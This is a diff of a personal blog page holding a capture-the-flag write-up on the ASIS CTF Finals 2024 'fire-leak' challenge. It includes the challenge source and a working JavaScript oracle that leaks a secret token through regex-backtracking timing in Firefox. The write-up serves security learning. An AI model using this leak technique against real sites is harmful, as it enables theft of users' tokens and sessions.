@@ -1,124 +1,463 @@
-<!doctype html><html lang=en><head lang=it><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"><title>fire-leak - ASIS CTF Finals 2024 | Salvatore Abello's Blog</title>
-<meta property="og:title" content="fire-leak - ASIS CTF Finals 2024"><meta property="og:description" content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.babelo.xyz/posts/fire-leak/"><meta property="og:site_name" content="Salvatore Abello's Blog"><meta property="og:image" content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=twitter:card content="summary"><meta name=twitter:title content="fire-leak - ASIS CTF Finals 2024"><meta name=twitter:description content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"><meta name=twitter:image content="https://blog.babelo.xyz/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"><meta name=keywords content="Cybersec,Writeup,ReDoS,client-side,csp"><meta property="article:published_time" content="2025-01-01T12:00:37+01:00"><meta property="article:modified_time" content="2025-01-01T12:00:37+01:00"><meta property="article:author" content="Salvatore Abello"><link rel=canonical href=https://blog.babelo.xyz/posts/fire-leak/><link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/font.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/syntax.css><link rel=preload href=/fonts/iosevka-regular.woff2 as=font type=font/woff2 crossorigin><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><div id=root><header><div id=brand><a class=icon-link href=https://blog.babelo.xyz/><img class=icon src=/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png></a><div class=text><a href=https://blog.babelo.xyz/><h1>Salvatore Abello's Blog</h1></a><h3>Hacking & other stuff</h3></div></div><nav><a href=/><b>Home</b></a>
-|
-<a href=/whoami/><b>Whoami</b></a>
-|
-<a href=/achievements/><b>Achievements</b></a>
-|
-<a href=/posts/><b>Posts</b></a>
-|
-<a href=/cves/><b>CVEs</b></a></nav><hr></header><div id=content><main><article><h1 class=title>fire-leak - ASIS CTF Finals 2024</h1><div class=post-meta><strong><span>Posted on</span>
-<time>2025-01-01 12:00:37</time>
-</strong><span>• 828 words</span>
-<span>• 4 minute read</span><div><span>Tags:</span>
-<a href=/tags/cybersec>Cybersec</a>,
-<a href=/tags/writeup>Writeup</a>,
-<a href=/tags/redos>ReDoS</a>,
-<a href=/tags/client-side>client-side</a>,
-<a href=/tags/csp>csp</a></div></div><div class=content><p>This year, I played in the ASIS CTF Finals with <code>@TheRomanXpl0it</code>, and we secured 7th place at the end of the CTF. I decided to write this up because I&rsquo;ve never seen a similar challenge before. <code>@simonedimaria</code> and I worked on this challenge and solved it after about 8 hours.</p><h2 id=overview><a class=full-clickable-heading href=#overview>Overview</a></h2><p>As the name suggests, this is an
-<a href=https://xsleaks.dev/ rel=noopener>XS-Leak</a>
-challenge. We&rsquo;re given the source code and there are three endpoints.</p><p><code>/save-flag</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// For the admin bot
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/save-flag&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>randomBytes</span><span class=p>(</span><span class=mi>6</span><span class=p>).</span><span class=nx>toString</span><span class=p>(</span><span class=s2>&#34;hex&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>flag</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>FLAG</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nx>tokens</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=nx>token</span><span class=p>,</span> <span class=nx>flag</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>({</span> <span class=nx>token</span><span class=p>,</span> <span class=nx>flag</span> <span class=p>});</span>
-</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(</span>
-</span></span><span class=line><span class=cl>        <span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>tokens</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=nx>token</span><span class=p>),</span> <span class=c1>// expired
-</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=mi>120_000</span>
-</span></span><span class=line><span class=cl>    <span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>clearCookie</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>).</span><span class=nx>cookie</span><span class=p>(</span><span class=s2>&#34;TOKEN&#34;</span><span class=p>,</span> <span class=nx>token</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Saved&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>});</span>
-</span></span></code></pre></div><p>Generates a random token and saves the flag. The token is deleted after 120 seconds.</p><p><code>/get</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// If you steal a token, use it :)
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/get&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nb>String</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>token</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>tokens</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>token</span><span class=p>)</span> <span class=o>??</span> <span class=s2>&#34;Not found&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>});</span>
-</span></span></code></pre></div><p>Retrieves the flag given its token.</p><p><code>/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>html</span> <span class=o>=</span> <span class=nb>String</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>html</span> <span class=o>??</span> <span class=nx>defaultHtml</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>html</span><span class=p>.</span><span class=nx>length</span> <span class=o>&gt;</span> <span class=mi>1024</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;?&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=sr>/[^\x20-\x7e\r\n]/i</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>html</span><span class=p>))</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;??&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=sr>/meta|link|src|data|href|svg|:|%|&amp;|\\|\/\//i</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>html</span><span class=p>))</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;???&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nx>res</span>
-</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>type</span><span class=p>(</span><span class=s2>&#34;html&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span>
-</span></span><span class=line><span class=cl>            <span class=s2>&#34;Content-Security-Policy&#34;</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>            <span class=s2>&#34;default-src &#39;none&#39;; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;&#34;</span>
-</span></span><span class=line><span class=cl>        <span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>html</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=s2>&#34;{{TOKEN}}&#34;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>TOKEN</span><span class=p>));</span>
-</span></span><span class=line><span class=cl><span class=p>});</span>
-</span></span></code></pre></div><p>This endpoint lets us render arbitrary HTML. If we put <code>{{TOKEN}}</code> inside our HTML, it will be replaced with the <code>TOKEN</code> cookie.</p><p>Also, a new token is generated every time a URL is reported.</p><p><code>bot.js</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>addCookies</span><span class=p>([</span>
-</span></span><span class=line><span class=cl>    <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;FLAG&#34;</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>        <span class=nx>value</span><span class=o>:</span> <span class=nx>FLAG</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>        <span class=nx>url</span><span class=o>:</span> <span class=nx>APP_URL</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>        <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>    <span class=p>},</span>
-</span></span><span class=line><span class=cl><span class=p>]);</span>
-</span></span><span class=line><span class=cl><span class=c1>// ...
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>page1</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>page1</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>APP_URL</span> <span class=o>+</span> <span class=s2>&#34;/save-flag&#34;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>3_000</span> <span class=p>});</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>2_000</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>page1</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=c1>// ...
-</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>page2</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>context</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>page2</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>5_000</span> <span class=p>});</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>60_000</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>page2</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
-</span></span></code></pre></div><p>The goal is:</p><ul><li>Steal the bot token within 60 seconds.</li><li>Use that token to retrieve the flag by making a request to <code>/get</code>.</li></ul><p>However, we have a few limitations:</p><ul><li>The HTML should be less than 1024 characters.</li><li>We can&rsquo;t use any characters besides <code>^\x20-\x7e\r\n</code>.</li><li>We can&rsquo;t use the following words: <code>meta</code>, <code>link</code>, <code>src</code>, <code>data</code>, <code>href</code>, <code>svg</code>.</li><li>We can&rsquo;t use the following characters: <code>:%&\</code>.</li></ul><p>Furthermore, there&rsquo;s a strict
-<a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP rel=noopener>CSP</a>
-which prevents us from using other techniques to leak the token.</p><style type=text/css>.notice{--title-color:#fff;--title-background-color:#6be;--content-color:#444;--content-background-color:#e7f2fa}.notice.info{--title-background-color:#fb7;--content-background-color:#fec}.notice.tip{--title-background-color:#5a5;--content-background-color:#efe}.notice.warning{--title-background-color:#c33;--content-background-color:#fee}@media(prefers-color-scheme:dark){.notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}}body.dark .notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}body.dark .notice.info{--title-background-color:#a50;--content-background-color:#420}body.dark .notice.tip{--title-background-color:#363;--content-background-color:#121}body.dark .notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--content-color);background:var(--content-background-color)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background-color)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div class="notice note"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="0 128 300 300"><path d="M150 128c82.813.0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812.0 278c0-82.813 67.188-150 150-150zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515.0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32.0 6.055-2.93 6.055-6.445zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758.0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515.0 6.445-2.148 6.64-4.883z"/></svg>
-</span>Note</p><p>The bot uses Firefox!</p></div><h2 id=solution><a class=full-clickable-heading href=#solution>Solution</a></h2><p>The first thing that came to our mind was searching for weird behaviors in Firefox, hoping to find something useful. And we did:</p><p><img src=/images/image-fireleak.png loading=lazy decoding=async alt="alt text"></p><p><strong>Note:</strong> If you don&rsquo;t know what a ReDoS is, check out
-<a href=https://blog.huli.tw/2023/06/12/en/redos-regular-expression-denial-of-service/ rel=noopener>this article!</a>
-.</p><p>We used the following regex and input:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>let</span> <span class=nx>regex</span> <span class=o>=</span> <span class=s2>&#34;^&#34;</span> <span class=o>+</span> <span class=nx>tobrute</span> <span class=o>+</span> <span class=s2>&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>input</span> <span class=o>=</span> <span class=sb>`{{TOKEN}}</span><span class=si>${</span><span class=s1>&#39;a&#39;</span><span class=p>.</span><span class=nx>repeat</span><span class=p>(</span><span class=nx>count</span><span class=p>)</span><span class=si>}</span><span class=sb>!`</span><span class=p>;</span>
-</span></span></code></pre></div><p>So if our token is <code>deadbeef</code>, our HTML element would be:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;deadbeefaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#34;</span> <span class=na>pattern</span><span class=o>=</span><span class=s>&#34;^d(([a-f0-9]+.)[a-f0-9])+$&#34;</span> <span class=p>/&gt;</span>
-</span></span></code></pre></div><p>By doing so, if the first part of the pattern (<code>^d</code>) is matched, the regex will cause a ReDoS and we would know that the first character of the token is <code>d</code>.</p><p><a href="https://blog.robertelder.org/regular-expression-visualizer/?the_regex=%5Ed%28%28%5Ba-f0-9%5D%2B.%29%5Ba-f0-9%5D%29%2B%24&amp;the_subject=deadaaaaaa!" rel=noopener>Here</a>
-you can see why it happens!</p><p>Now we need a way to detect the ReDoS.</p><p>We noticed that if we try to change the location of the window during the ReDoS (to <code>about:blank</code>), Firefox will go to that location only after finishing the validation process.</p><p>So, we can detect how much time it takes to let that happen by continuously checking if we can retrieve the value of <code>window.opener</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>sleep</span><span class=p>(</span><span class=nx>time</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>((</span><span class=nx>resolve</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>time</span><span class=p>));</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>popup</span><span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=s2>&#34;palle&#34;</span><span class=p>,</span> <span class=s2>&#34;width=200,height=100&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>oracle</span><span class=p>(</span><span class=nx>tobrute</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>final_pattern</span> <span class=o>=</span> <span class=s2>&#34;^&#34;</span> <span class=o>+</span> <span class=nx>tobrute</span> <span class=o>+</span> <span class=s2>&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;PATTERN&#34;</span><span class=p>,</span> <span class=nx>final_pattern</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>count</span> <span class=o>=</span> <span class=mi>30</span> <span class=o>+</span> <span class=nx>tobrute</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>tokstr</span> <span class=o>=</span> <span class=s2>&#34;{{TOKEN}}&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>let</span> <span class=nx>html</span> <span class=o>=</span> <span class=sb>`&lt;input value=&#34;{{TOKEN}}</span><span class=si>${</span><span class=s1>&#39;a&#39;</span><span class=p>.</span><span class=nx>repeat</span><span class=p>(</span><span class=nx>count</span><span class=p>)</span><span class=si>}</span><span class=sb>!&#34; pattern=&#34;</span><span class=si>${</span><span class=nx>final_pattern</span><span class=si>}</span><span class=sb>&#34; /&gt;`</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>html</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>w</span> <span class=o>=</span> <span class=nx>popup</span><span class=p>(</span><span class=s2>&#34;http://web:3000/?html=&#34;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>html</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>200</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nx>w</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s2>&#34;about:blank&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>start</span> <span class=o>=</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>((</span><span class=nx>resolve</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>interval</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>                <span class=nx>w</span><span class=p>.</span><span class=nx>origin</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>                <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>interval</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>                <span class=nx>resolve</span><span class=p>();</span>
-</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>                <span class=c1>// Do nothing, just wait for the next interval
-</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>}</span>
-</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>100</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=p>});</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>performance</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>start</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p>We tried to execute this locally and&mldr; it worked!</p><p><img src=/images/image-fireleak1.png loading=lazy decoding=async alt="alt text"></p><p>So it should also work on the remote server, right?
-Unfortunately, no. Timing attacks using ReDoS are inherently unstable, as they depend on numerous factors. While we were able to leak the entire token locally in just 30 to 40 seconds, on the remote server, we were only getting garbage.</p><p>To address this, we had to do a bit of fine-tuning by re-using the same window without closing it, adjusting the sleep durations, and the length of our input values&mldr; and still, we were not able to leak the token but at least we were leaking a part of it.</p><p>At some point, we decided to brute-force the last two characters because we wasted more than 3 hours trying to make this exploit stable. And it worked!</p><p><img src=/images/image-fireleak2.png loading=lazy decoding=async alt="alt text"></p><p>We were the only team that managed to solve this challenge.</p><p><img src=/images/image-fireleak3.png loading=lazy decoding=async alt="alt text"></p><h2 id=conclusions><a class=full-clickable-heading href=#conclusions>Conclusions</a></h2><p>After reading the
-<a href=https://blog.arkark.dev/2024/12/30/asisctf-finals/ rel=noopener>author&rsquo;s writeup</a>
-, we saw that he used a slightly different approach by doing frame counting, and his exploit leaks the token in about 30 seconds!</p><p>Anyway, thanks for the great CTF, we had a lot of fun!</p></div></article></main></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/salvatore-abello>Github</a>
-|
-<a href=https://www.linkedin.com/in/salvatore-abello-411b64252/>Linkedin</a>
-|
-<a href=https://x.com/salvatoreabello>X</a></p><p class=copyright>Copyright © 2025. All rights deserved.
-<a href=https://blog.babelo.xyz/><strong>Salvatore Abello</strong></a>.</p><hr><code>Made with ❤️ by <strong>Salvatore Abello</strong></code> | <a href=/index.xml><b>RSS</b></a></footer></div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+  
+
+<head lang="it"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+  <meta name="description" content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"/>
+  <title>fire-leak - ASIS CTF Finals 2024 | Salvatore Abello&#39;s Blog</title>
+
+  
+  <meta property="og:title"       content="fire-leak - ASIS CTF Finals 2024"/>
+  <meta property="og:description" content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"/>
+  <meta property="og:type"        content="article"/>
+  <meta property="og:url"         content="http://localhost:1313/posts/fire-leak/"/>
+  <meta property="og:site_name"   content="Salvatore Abello&#39;s Blog"/>
+  
+    <meta property="og:image" content="http://localhost:1313/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/>
+  
+
+  
+  <meta name="twitter:card"        content="summary"/>
+  <meta name="twitter:title"       content="fire-leak - ASIS CTF Finals 2024"/>
+  <meta name="twitter:description" content="This year, I played in the ASIS CTF Finals with @TheRomanXpl0it, and we secured 7th place at the end of the CTF. I decided to write this up because I&amp;rsquo;ve …"/>
+  
+    <meta name="twitter:image" content="http://localhost:1313/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"/>
+  
+
+  <meta name="keywords" content="Cybersec, Writeup, ReDoS, client-side, csp"/>
+    <meta property="article:published_time" content="2025-01-01T12:00:37&#43;01:00"/>
+    <meta property="article:modified_time"  content="2025-01-01T12:00:37&#43;01:00"/>
+    <meta property="article:author" content="Salvatore Abello"/>
+
+  <link rel="canonical" href="http://localhost:1313/posts/fire-leak/"/>
+
+  
+  
+  
+  
+  
+  
+  
+    <link rel="stylesheet" href="/css/reset.css"/>
+    <link rel="stylesheet" href="/css/font.css"/>
+    <link rel="stylesheet" href="/css/smigle.css">
+  
+  <link rel="stylesheet" href="/css/syntax.css">
+
+  
+  
+
+  <link rel="preload" href="/fonts/iosevka-regular.woff2" as="font" type="font/woff2" crossorigin/>
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color"           content="#ffffff">
+
+  
+  
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="http://localhost:1313/">
+      <img
+        class="icon"
+        src="/images/65adf8e914bdc50b5f5f2e8b91b68cb1.png"
+      />
+    </a>
+    <div class="text">
+      <a href="http://localhost:1313/"><h1>Salvatore Abello&#39;s Blog</h1></a>
+      <h3>Hacking &amp; other stuff</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/whoami/"><b>Whoami</b></a>
+      
+         | 
+        <a href="/achievements/"><b>Achievements</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/cves/"><b>CVEs</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">fire-leak - ASIS CTF Finals 2024</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2025-01-01 12:00:37</time>
+    
+    
+  </strong>
+  <span> • 828 words</span>
+  <span> • 4 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/cybersec">Cybersec</a>, 
+        <a href="/tags/writeup">Writeup</a>, 
+        <a href="/tags/redos">ReDoS</a>, 
+        <a href="/tags/client-side">client-side</a>, 
+        <a href="/tags/csp">csp</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>This year, I played in the ASIS CTF Finals with <code>@TheRomanXpl0it</code>, and we secured 7th place at the end of the CTF. I decided to write this up because I&rsquo;ve never seen a similar challenge before. <code>@simonedimaria</code> and I worked on this challenge and solved it after about 8 hours.</p>
